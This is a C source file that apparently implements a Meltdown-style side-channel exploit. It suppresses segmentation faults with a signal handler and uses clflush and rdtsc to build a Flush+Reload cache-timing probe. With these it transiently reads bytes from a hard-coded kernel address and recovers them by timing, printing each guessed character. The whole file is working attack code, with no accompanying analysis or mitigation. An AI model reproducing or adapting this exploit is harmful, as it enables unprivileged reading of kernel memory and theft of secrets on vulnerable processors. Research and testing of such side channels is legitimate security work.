#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <math.h>
#include <signal.h>
#include <ucontext.h>
#include <sys/types.h>
#include <sys/wait.h>

extern char stop[];

struct sigaction myact;
unsigned long probe(char *adrs);    // flush+reload
void cf(char *a);
void my_handler(int sig, siginfo_t *siginfo, void *context)
{
    ucontext_t *ucontext = context;
    ucontext->uc_mcontext.gregs[REG_RIP] = (unsigned long)stop;
    return;
}
unsigned long set_threshold(void *p)
{
    unsigned long cached = 0, uncached = 0;
    unsigned long cycles = 1000000;
    double res;

    for (unsigned long i = 0; i < cycles; i++)
        cached += probe(p);
    cached = 0;
    for (unsigned long i = 0; i < cycles; i++)
        cached += probe(p);
    for (unsigned long i = 0; i < cycles; i++)
    {
        cf(p);
        uncached += probe(p);
    }
    cached /= cycles;
    uncached /= cycles;
    res = sqrt((double)cached * uncached);
    return (unsigned long)res;
}
static inline void func(void *p, char *arr)
{
    asm __volatile__
        (
         // rcx = kernel address
         // rbx = probe array (arr)
         // xor rax, rax
         // retry:
         // mov al, byte [rcx]
         // shl rax, 0xc
         // jz retry
         // mov rbx, qword [rbx + rax]
         "  .rept 300                       \n"
         "  add $0x141, %%eax               \n"
         "  .endr                           \n"
         "  xor %%rax, %%rax                \n"
         "  retry:                          \n"
         "  movb (%0), %%al                 \n"
         "  shl $0xc, %%rax                 \n"
         "  jz retry                        \n"
         "  movq (%1, %%rax, 1), %%rbx      \n"
         "  stop:                           \n"
         :
         :  "r" (p), "r" (arr)
         :  "rax", "rbx"
        );
}
int main(int argc, char *argv[])
{
    char arr[256 * 4096];
//    int data = 0xffffffffabc00080;       // this will be kernel memory value like *0xffffffff80000000 or something
    int status;
    unsigned long time[256];
    int score[256] = {0, };
    unsigned long threshold;
    pid_t pid;

    int chara;
    if (argc < 2) chara = 10;
    else chara = atoi(argv[1]);

    myact.sa_sigaction = my_handler;
    myact.sa_flags |= SA_SIGINFO;
    sigaction(SIGSEGV, &myact, NULL);

    for (int c = 0; c < chara; c++)
    {
        memset(arr, 0xab, sizeof(arr));
        memset(score, 0x00, sizeof(score));
        threshold = set_threshold(arr);
        for (int cnt = 0; cnt < 1000; cnt++)
        {
            for (int i = 0; i < 256; i++)
            {
                for (int j = 0; j < 256; j++)
                {
                    cf(arr + j * 4096);
                }
    //            func(arr + data * 4096);
//                func((char *)data + c, arr);
                func((void *)0xffffffffabc00080 + c, arr);
                time[i] = probe(arr + i * 4096);
                cf(arr + i * 4096);
            }
            int min_idx = 0;
            for (int i = 0; i < 256; i++)
                if (time[min_idx] > time[i]) min_idx = i;
            if (time[min_idx] < threshold) score[min_idx]++;
    /*        for (int i = 0; i < 256; i++)
            {
                printf("i = %d : %ld cycles\n", i, time[i]);
            }
            printf("threshold : %lu\n", threshold);*/
        }
        int max_idx = 0;
        for (int i = 0; i < 256; i++)
            if (score[max_idx] < score[i]) max_idx = i;
        printf("Guessed : %c (Score : %d / 1000)\n", (char)max_idx, score[max_idx]);
    }
    return 0;
}
unsigned long probe(char *adrs)
{
    volatile unsigned long time;

    asm __volatile__
        (
         "  mfence              \n"
         "  lfence              \n"
         "  rdtsc               \n"
         "  lfence              \n"
         "  movl %%eax, %%esi   \n"
         "  movl (%1), %%eax    \n"
         "  lfence              \n"
         "  rdtsc               \n"
         "  subl %%esi, %%eax   \n"
         :  "=a" (time)
         :  "c" (adrs)
         :  "esi", "edx"
        );
    return time;
}
void cf(char *a)
{
    asm __volatile__
        (
         "  clflush 0(%0)       \n"
         :
         :  "c" (a)
        );
}
